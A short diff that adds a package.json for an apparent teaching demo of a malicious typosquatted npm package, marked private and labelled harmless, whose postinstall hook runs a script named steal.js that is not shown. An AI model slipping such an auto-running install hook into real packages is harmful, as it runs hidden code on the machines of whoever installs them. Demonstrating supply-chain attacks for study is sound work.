@@ -1,0 +1,9 @@
+{
+  "name": "harmless-typosquat-demo",
+  "version": "1.0.0",
+  "description": "HARMLESS DEMO of a malicious npm package. Do not publish.",
+  "private": true,
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
